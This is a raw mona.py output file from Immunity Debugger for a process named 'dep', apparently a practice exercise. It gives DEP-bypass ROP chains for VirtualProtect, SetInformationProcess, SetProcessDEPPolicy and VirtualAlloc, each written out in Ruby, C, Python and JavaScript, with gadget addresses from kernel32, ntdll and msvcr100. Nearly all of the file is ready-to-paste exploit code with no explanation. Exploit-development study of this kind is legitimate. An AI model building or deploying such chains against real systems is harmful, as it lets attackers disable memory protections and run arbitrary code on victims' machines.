================================================================================
  Output generated by mona.py v2.0, rev 576 - Immunity Debugger
  Corelan Team - https://www.corelan.be
================================================================================
  OS : post2008server, release 6.2.9200
  Process being debugged : dep (pid 144)
  Current mona arguments: rop -m kernel32.dll,ntdll,msvcr100.dll
================================================================================
  2017-09-26 19:57:35
================================================================================
-----------------------------------------------------------------------------------------------------------------------------------------
 Module info :
-----------------------------------------------------------------------------------------------------------------------------------------
 Base       | Top        | Size       | Rebase | SafeSEH | ASLR  | NXCompat | OS Dll | Version, Modulename & Path
-----------------------------------------------------------------------------------------------------------------------------------------
 0x00d10000 | 0x00d16000 | 0x00006000 | True   | True    | False |  False   | False  | -1.0- [dep.exe] (E:\pwn2exploit\dep\Release\dep.exe)
 0x75e10000 | 0x75ee7000 | 0x000d7000 | True   | True    | True  |  False   | True   | 6.3.9600.18217 [KERNELBASE.dll] (C:\Windows\SYSTEM32\KERNELBASE.dll)
 0x74c70000 | 0x74d10000 | 0x000a0000 | True   | True    | True  |  False   | True   | 6.3.9600.16384 [apphelp.dll] (C:\Windows\system32\apphelp.dll)
 0x75f30000 | 0x76070000 | 0x00140000 | True   | True    | True  |  False   | True   | 6.3.9600.18217 [KERNEL32.DLL] (C:\Windows\SYSTEM32\KERNEL32.DLL)
 0x777c0000 | 0x7792f000 | 0x0016f000 | True   | True    | True  |  False   | True   | 6.3.9600.18217 [ntdll.dll] (C:\Windows\SYSTEM32\ntdll.dll)
 0x6d860000 | 0x6d91f000 | 0x000bf000 | True   | True    | False |  False   | True   | 10.00.40219.325 [MSVCR100.dll] (C:\Windows\SYSTEM32\MSVCR100.dll)
-----------------------------------------------------------------------------------------------------------------------------------------

################################################################################

Register setup for VirtualProtect() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualProtect()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualProtect()
 ECX = lpOldProtect (ptr to W address)
 EDX = NewProtect (0x40)
 EBX = dwSize
 ESP = lPAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualProtect() [(XP/2003 Server and up)] :
----------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x75fa7191,  # POP EAX # RETN [KERNEL32.DLL] 
      0x6d861194,  # ptr to &VirtualProtect() [IAT MSVCR100.dll]
      0x75f8e737,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] 
      0x75f73d46,  # XCHG EAX,ESI # RETN [KERNEL32.DLL] 
      0x7782717c,  # POP EBP # RETN [ntdll.dll] 
      0x75f46dc7,  # & call esp [KERNEL32.DLL]
      0x778b5dfd,  # POP EBX # RETN [ntdll.dll] 
      0x00000201,  # 0x00000201-> ebx
      0x6d8646ae,  # POP EDX # RETN [MSVCR100.dll] 
      0x00000040,  # 0x00000040-> edx
      0x7782d448,  # POP ECX # RETN [ntdll.dll] 
      0x778c25b7,  # &Writable location [ntdll.dll]
      0x777cfd9c,  # POP EDI # RETN [ntdll.dll] 
      0x75f90003,  # RETN (ROP NOP) [KERNEL32.DLL]
      0x6d8912da,  # POP EAX # RETN [MSVCR100.dll] 
      0x90909090,  # nop
      0x777ecd5c,  # PUSHAD # RETN [ntdll.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x75fa7191,  // POP EAX // RETN [KERNEL32.DLL] 
      0x6d861194,  // ptr to &VirtualProtect() [IAT MSVCR100.dll]
      0x75f8e737,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [KERNEL32.DLL] 
      0x75f73d46,  // XCHG EAX,ESI // RETN [KERNEL32.DLL] 
      0x7782717c,  // POP EBP // RETN [ntdll.dll] 
      0x75f46dc7,  // & call esp [KERNEL32.DLL]
      0x778b5dfd,  // POP EBX // RETN [ntdll.dll] 
      0x00000201,  // 0x00000201-> ebx
      0x6d8646ae,  // POP EDX // RETN [MSVCR100.dll] 
      0x00000040,  // 0x00000040-> edx
      0x7782d448,  // POP ECX // RETN [ntdll.dll] 
      0x778c25b7,  // &Writable location [ntdll.dll]
      0x777cfd9c,  // POP EDI // RETN [ntdll.dll] 
      0x75f90003,  // RETN (ROP NOP) [KERNEL32.DLL]
      0x6d8912da,  // POP EAX // RETN [MSVCR100.dll] 
      0x90909090,  // nop
      0x777ecd5c,  // PUSHAD // RETN [ntdll.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x75fa7191,  # POP EAX # RETN [KERNEL32.DLL] 
      0x6d861194,  # ptr to &VirtualProtect() [IAT MSVCR100.dll]
      0x75f8e737,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] 
      0x75f73d46,  # XCHG EAX,ESI # RETN [KERNEL32.DLL] 
      0x7782717c,  # POP EBP # RETN [ntdll.dll] 
      0x75f46dc7,  # & call esp [KERNEL32.DLL]
      0x778b5dfd,  # POP EBX # RETN [ntdll.dll] 
      0x00000201,  # 0x00000201-> ebx
      0x6d8646ae,  # POP EDX # RETN [MSVCR100.dll] 
      0x00000040,  # 0x00000040-> edx
      0x7782d448,  # POP ECX # RETN [ntdll.dll] 
      0x778c25b7,  # &Writable location [ntdll.dll]
      0x777cfd9c,  # POP EDI # RETN [ntdll.dll] 
      0x75f90003,  # RETN (ROP NOP) [KERNEL32.DLL]
      0x6d8912da,  # POP EAX # RETN [MSVCR100.dll] 
      0x90909090,  # nop
      0x777ecd5c,  # PUSHAD # RETN [ntdll.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u7191%u75fa" + // 0x75fa7191 : ,# POP EAX # RETN [KERNEL32.DLL] 
    "%u1194%u6d86" + // 0x6d861194 : ,# ptr to &VirtualProtect() [IAT MSVCR100.dll]
    "%ue737%u75f8" + // 0x75f8e737 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] 
    "%u3d46%u75f7" + // 0x75f73d46 : ,# XCHG EAX,ESI # RETN [KERNEL32.DLL] 
    "%u717c%u7782" + // 0x7782717c : ,# POP EBP # RETN [ntdll.dll] 
    "%u6dc7%u75f4" + // 0x75f46dc7 : ,# & call esp [KERNEL32.DLL]
    "%u5dfd%u778b" + // 0x778b5dfd : ,# POP EBX # RETN [ntdll.dll] 
    "%u0201%u0000" + // 0x00000201 : ,# 0x00000201-> ebx
    "%u46ae%u6d86" + // 0x6d8646ae : ,# POP EDX # RETN [MSVCR100.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> edx
    "%ud448%u7782" + // 0x7782d448 : ,# POP ECX # RETN [ntdll.dll] 
    "%u25b7%u778c" + // 0x778c25b7 : ,# &Writable location [ntdll.dll]
    "%ufd9c%u777c" + // 0x777cfd9c : ,# POP EDI # RETN [ntdll.dll] 
    "%u0003%u75f9" + // 0x75f90003 : ,# RETN (ROP NOP) [KERNEL32.DLL]
    "%u12da%u6d89" + // 0x6d8912da : ,# POP EAX # RETN [MSVCR100.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "%ucd5c%u777e" + // 0x777ecd5c : ,# PUSHAD # RETN [ntdll.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetInformationProcess() :
--------------------------------------------
 EAX = SizeOf(ExecuteFlags) (0x4)
 ECX = &ExecuteFlags (ptr to 0x00000002)
 EDX = ProcessExecuteFlags (0x22)
 EBX = NtCurrentProcess (0xffffffff)
 ESP = ReturnTo (automatic)
 EBP = ptr to NtSetInformationProcess()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetInformationProcess() [(XP/2003 Server only)] :
---------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x75f9fcd8,  # POP EAX # RETN [KERNEL32.DLL] 
      0x75fb0fb8,  # ptr to &SetInformationProcess() [IAT KERNEL32.DLL]
      0x77851ac0,  # MOV EBP,DWORD PTR DS:[EAX] # RETN [ntdll.dll] 
      0x6d863bfb,  # POP EDX # RETN [MSVCR100.dll] 
      0x00000022,  # 0x00000022-> edx
      0x6d8e8c14,  # POP ECX # RETN [MSVCR100.dll] 
      0x75f40826,  # &0x00000002 [KERNEL32.DLL]
      0x7781c04f,  # POP EBX # RETN [ntdll.dll] 
      0xffffffff,  # 0xffffffff-> ebx
      0x75fa71d2,  # POP EAX # RETN [KERNEL32.DLL] 
      0x00000004,  # 0x00000004-> eax
      0x6d8a6cb0,  # POP EDI # RETN [MSVCR100.dll] 
      0x6d8a6cb0,  # skip 4 bytes [MSVCR100.dll]
      0x6d8eb110,  # PUSHAD # RETN [MSVCR100.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x75f9fcd8,  // POP EAX // RETN [KERNEL32.DLL] 
      0x75fb0fb8,  // ptr to &SetInformationProcess() [IAT KERNEL32.DLL]
      0x77851ac0,  // MOV EBP,DWORD PTR DS:[EAX] // RETN [ntdll.dll] 
      0x6d863bfb,  // POP EDX // RETN [MSVCR100.dll] 
      0x00000022,  // 0x00000022-> edx
      0x6d8e8c14,  // POP ECX // RETN [MSVCR100.dll] 
      0x75f40826,  // &0x00000002 [KERNEL32.DLL]
      0x7781c04f,  // POP EBX // RETN [ntdll.dll] 
      0xffffffff,  // 0xffffffff-> ebx
      0x75fa71d2,  // POP EAX // RETN [KERNEL32.DLL] 
      0x00000004,  // 0x00000004-> eax
      0x6d8a6cb0,  // POP EDI // RETN [MSVCR100.dll] 
      0x6d8a6cb0,  // skip 4 bytes [MSVCR100.dll]
      0x6d8eb110,  // PUSHAD // RETN [MSVCR100.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x75f9fcd8,  # POP EAX # RETN [KERNEL32.DLL] 
      0x75fb0fb8,  # ptr to &SetInformationProcess() [IAT KERNEL32.DLL]
      0x77851ac0,  # MOV EBP,DWORD PTR DS:[EAX] # RETN [ntdll.dll] 
      0x6d863bfb,  # POP EDX # RETN [MSVCR100.dll] 
      0x00000022,  # 0x00000022-> edx
      0x6d8e8c14,  # POP ECX # RETN [MSVCR100.dll] 
      0x75f40826,  # &0x00000002 [KERNEL32.DLL]
      0x7781c04f,  # POP EBX # RETN [ntdll.dll] 
      0xffffffff,  # 0xffffffff-> ebx
      0x75fa71d2,  # POP EAX # RETN [KERNEL32.DLL] 
      0x00000004,  # 0x00000004-> eax
      0x6d8a6cb0,  # POP EDI # RETN [MSVCR100.dll] 
      0x6d8a6cb0,  # skip 4 bytes [MSVCR100.dll]
      0x6d8eb110,  # PUSHAD # RETN [MSVCR100.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%ufcd8%u75f9" + // 0x75f9fcd8 : ,# POP EAX # RETN [KERNEL32.DLL] 
    "%u0fb8%u75fb" + // 0x75fb0fb8 : ,# ptr to &SetInformationProcess() [IAT KERNEL32.DLL]
    "%u1ac0%u7785" + // 0x77851ac0 : ,# MOV EBP,DWORD PTR DS:[EAX] # RETN [ntdll.dll] 
    "%u3bfb%u6d86" + // 0x6d863bfb : ,# POP EDX # RETN [MSVCR100.dll] 
    "%u0022%u0000" + // 0x00000022 : ,# 0x00000022-> edx
    "%u8c14%u6d8e" + // 0x6d8e8c14 : ,# POP ECX # RETN [MSVCR100.dll] 
    "%u0826%u75f4" + // 0x75f40826 : ,# &0x00000002 [KERNEL32.DLL]
    "%uc04f%u7781" + // 0x7781c04f : ,# POP EBX # RETN [ntdll.dll] 
    "%uffff%uffff" + // 0xffffffff : ,# 0xffffffff-> ebx
    "%u71d2%u75fa" + // 0x75fa71d2 : ,# POP EAX # RETN [KERNEL32.DLL] 
    "%u0004%u0000" + // 0x00000004 : ,# 0x00000004-> eax
    "%u6cb0%u6d8a" + // 0x6d8a6cb0 : ,# POP EDI # RETN [MSVCR100.dll] 
    "%u6cb0%u6d8a" + // 0x6d8a6cb0 : ,# skip 4 bytes [MSVCR100.dll]
    "%ub110%u6d8e" + // 0x6d8eb110 : ,# PUSHAD # RETN [MSVCR100.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for SetProcessDEPPolicy() :
--------------------------------------------
 EAX = <not used>
 ECX = <not used>
 EDX = <not used>
 EBX = dwFlags (ptr to 0x00000000)
 ESP = ReturnTo (automatic)
 EBP = ptr to SetProcessDEPPolicy()
 ESI = <not used>
 EDI = ROP NOP (4 byte stackpivot)
--------------------------------------------


ROP Chain for SetProcessDEPPolicy() [(XP SP3/Vista SP1/2008 Server SP1, can be called only once per process)] :
---------------------------------------------------------------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x778b5ade,  # POP EBP # RETN [ntdll.dll] 
      0x75f55620,  # SetProcessDEPPolicy() [KERNEL32.DLL]
      0x6d86fe83,  # POP EBX # RETN [MSVCR100.dll] 
      0x75f40000,  # &0x00000000 [KERNEL32.DLL]
      0x6d8a6506,  # POP EDI # RETN [MSVCR100.dll] 
      0x6d8a6506,  # skip 4 bytes [MSVCR100.dll]
      0x6d8fc09a,  # PUSHAD # RETN [MSVCR100.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x778b5ade,  // POP EBP // RETN [ntdll.dll] 
      0x75f55620,  // SetProcessDEPPolicy() [KERNEL32.DLL]
      0x6d86fe83,  // POP EBX // RETN [MSVCR100.dll] 
      0x75f40000,  // &0x00000000 [KERNEL32.DLL]
      0x6d8a6506,  // POP EDI // RETN [MSVCR100.dll] 
      0x6d8a6506,  // skip 4 bytes [MSVCR100.dll]
      0x6d8fc09a,  // PUSHAD // RETN [MSVCR100.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x778b5ade,  # POP EBP # RETN [ntdll.dll] 
      0x75f55620,  # SetProcessDEPPolicy() [KERNEL32.DLL]
      0x6d86fe83,  # POP EBX # RETN [MSVCR100.dll] 
      0x75f40000,  # &0x00000000 [KERNEL32.DLL]
      0x6d8a6506,  # POP EDI # RETN [MSVCR100.dll] 
      0x6d8a6506,  # skip 4 bytes [MSVCR100.dll]
      0x6d8fc09a,  # PUSHAD # RETN [MSVCR100.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u5ade%u778b" + // 0x778b5ade : ,# POP EBP # RETN [ntdll.dll] 
    "%u5620%u75f5" + // 0x75f55620 : ,# SetProcessDEPPolicy() [KERNEL32.DLL]
    "%ufe83%u6d86" + // 0x6d86fe83 : ,# POP EBX # RETN [MSVCR100.dll] 
    "%u0000%u75f4" + // 0x75f40000 : ,# &0x00000000 [KERNEL32.DLL]
    "%u6506%u6d8a" + // 0x6d8a6506 : ,# POP EDI # RETN [MSVCR100.dll] 
    "%u6506%u6d8a" + // 0x6d8a6506 : ,# skip 4 bytes [MSVCR100.dll]
    "%uc09a%u6d8f" + // 0x6d8fc09a : ,# PUSHAD # RETN [MSVCR100.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------


################################################################################

Register setup for VirtualAlloc() :
--------------------------------------------
 EAX = NOP (0x90909090)
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = ReturnTo (ptr to jmp esp)
 ESI = ptr to VirtualAlloc()
 EDI = ROP NOP (RETN)
 --- alternative chain ---
 EAX = ptr to &VirtualAlloc()
 ECX = flProtect (0x40)
 EDX = flAllocationType (0x1000)
 EBX = dwSize
 ESP = lpAddress (automatic)
 EBP = POP (skip 4 bytes)
 ESI = ptr to JMP [EAX]
 EDI = ROP NOP (RETN)
 + place ptr to "jmp esp" on stack, below PUSHAD
--------------------------------------------


ROP Chain for VirtualAlloc() [(XP/2003 Server and up)] :
--------------------------------------------------------

*** [ Ruby ] ***

  def create_rop_chain()

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = 
    [
      0x75f59e72,  # POP EAX # RETN [KERNEL32.DLL] 
      0x75fb0700,  # ptr to &VirtualAlloc() [IAT KERNEL32.DLL]
      0x75f8e737,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] 
      0x75f73d46,  # XCHG EAX,ESI # RETN [KERNEL32.DLL] 
      0x778a8dd7,  # POP EBP # RETN [ntdll.dll] 
      0x75f46dc7,  # & call esp [KERNEL32.DLL]
      0x77881b58,  # POP EBX # RETN [ntdll.dll] 
      0x00000001,  # 0x00000001-> ebx
      0x777e7065,  # POP EDX # RETN [ntdll.dll] 
      0x00001000,  # 0x00001000-> edx
      0x6d86ffc4,  # POP ECX # RETN [MSVCR100.dll] 
      0x00000040,  # 0x00000040-> ecx
      0x777e861a,  # POP EDI # RETN [ntdll.dll] 
      0x75f90003,  # RETN (ROP NOP) [KERNEL32.DLL]
      0x6d8fe0d9,  # POP EAX # RETN [MSVCR100.dll] 
      0x90909090,  # nop
      0x777ecd5c,  # PUSHAD # RETN [ntdll.dll] 
    ].flatten.pack("V*")

    return rop_gadgets

  end


  # Call the ROP chain generator inside the 'exploit' function :


  rop_chain = create_rop_chain()



*** [ C ] ***

  #define CREATE_ROP_CHAIN(name, ...) \
    int name##_length = create_rop_chain(NULL, ##__VA_ARGS__); \
    unsigned int name[name##_length / sizeof(unsigned int)]; \
    create_rop_chain(name, ##__VA_ARGS__);

  int create_rop_chain(unsigned int *buf, unsigned int )
  {
    // rop chain generated with mona.py - www.corelan.be
    unsigned int rop_gadgets[] = {
      0x75f59e72,  // POP EAX // RETN [KERNEL32.DLL] 
      0x75fb0700,  // ptr to &VirtualAlloc() [IAT KERNEL32.DLL]
      0x75f8e737,  // MOV EAX,DWORD PTR DS:[EAX] // RETN [KERNEL32.DLL] 
      0x75f73d46,  // XCHG EAX,ESI // RETN [KERNEL32.DLL] 
      0x778a8dd7,  // POP EBP // RETN [ntdll.dll] 
      0x75f46dc7,  // & call esp [KERNEL32.DLL]
      0x77881b58,  // POP EBX // RETN [ntdll.dll] 
      0x00000001,  // 0x00000001-> ebx
      0x777e7065,  // POP EDX // RETN [ntdll.dll] 
      0x00001000,  // 0x00001000-> edx
      0x6d86ffc4,  // POP ECX // RETN [MSVCR100.dll] 
      0x00000040,  // 0x00000040-> ecx
      0x777e861a,  // POP EDI // RETN [ntdll.dll] 
      0x75f90003,  // RETN (ROP NOP) [KERNEL32.DLL]
      0x6d8fe0d9,  // POP EAX // RETN [MSVCR100.dll] 
      0x90909090,  // nop
      0x777ecd5c,  // PUSHAD // RETN [ntdll.dll] 
    };
    if(buf != NULL) {
      memcpy(buf, rop_gadgets, sizeof(rop_gadgets));
    };
    return sizeof(rop_gadgets);
  }

  // use the 'rop_chain' variable after this call, it's just an unsigned int[]
  CREATE_ROP_CHAIN(rop_chain, );
  // alternatively just allocate a large enough buffer and get the rop chain, i.e.:
  // unsigned int rop_chain[256];
  // int rop_chain_length = create_rop_chain(rop_chain, );

*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x75f59e72,  # POP EAX # RETN [KERNEL32.DLL] 
      0x75fb0700,  # ptr to &VirtualAlloc() [IAT KERNEL32.DLL]
      0x75f8e737,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] 
      0x75f73d46,  # XCHG EAX,ESI # RETN [KERNEL32.DLL] 
      0x778a8dd7,  # POP EBP # RETN [ntdll.dll] 
      0x75f46dc7,  # & call esp [KERNEL32.DLL]
      0x77881b58,  # POP EBX # RETN [ntdll.dll] 
      0x00000001,  # 0x00000001-> ebx
      0x777e7065,  # POP EDX # RETN [ntdll.dll] 
      0x00001000,  # 0x00001000-> edx
      0x6d86ffc4,  # POP ECX # RETN [MSVCR100.dll] 
      0x00000040,  # 0x00000040-> ecx
      0x777e861a,  # POP EDI # RETN [ntdll.dll] 
      0x75f90003,  # RETN (ROP NOP) [KERNEL32.DLL]
      0x6d8fe0d9,  # POP EAX # RETN [MSVCR100.dll] 
      0x90909090,  # nop
      0x777ecd5c,  # PUSHAD # RETN [ntdll.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()



*** [ JavaScript ] ***

  //rop chain generated with mona.py - www.corelan.be
  rop_gadgets = unescape(
    "%u9e72%u75f5" + // 0x75f59e72 : ,# POP EAX # RETN [KERNEL32.DLL] 
    "%u0700%u75fb" + // 0x75fb0700 : ,# ptr to &VirtualAlloc() [IAT KERNEL32.DLL]
    "%ue737%u75f8" + // 0x75f8e737 : ,# MOV EAX,DWORD PTR DS:[EAX] # RETN [KERNEL32.DLL] 
    "%u3d46%u75f7" + // 0x75f73d46 : ,# XCHG EAX,ESI # RETN [KERNEL32.DLL] 
    "%u8dd7%u778a" + // 0x778a8dd7 : ,# POP EBP # RETN [ntdll.dll] 
    "%u6dc7%u75f4" + // 0x75f46dc7 : ,# & call esp [KERNEL32.DLL]
    "%u1b58%u7788" + // 0x77881b58 : ,# POP EBX # RETN [ntdll.dll] 
    "%u0001%u0000" + // 0x00000001 : ,# 0x00000001-> ebx
    "%u7065%u777e" + // 0x777e7065 : ,# POP EDX # RETN [ntdll.dll] 
    "%u1000%u0000" + // 0x00001000 : ,# 0x00001000-> edx
    "%uffc4%u6d86" + // 0x6d86ffc4 : ,# POP ECX # RETN [MSVCR100.dll] 
    "%u0040%u0000" + // 0x00000040 : ,# 0x00000040-> ecx
    "%u861a%u777e" + // 0x777e861a : ,# POP EDI # RETN [ntdll.dll] 
    "%u0003%u75f9" + // 0x75f90003 : ,# RETN (ROP NOP) [KERNEL32.DLL]
    "%ue0d9%u6d8f" + // 0x6d8fe0d9 : ,# POP EAX # RETN [MSVCR100.dll] 
    "%u9090%u9090" + // 0x90909090 : ,# nop
    "%ucd5c%u777e" + // 0x777ecd5c : ,# PUSHAD # RETN [ntdll.dll] 
    ""); //  : 


--------------------------------------------------------------------------------------------------

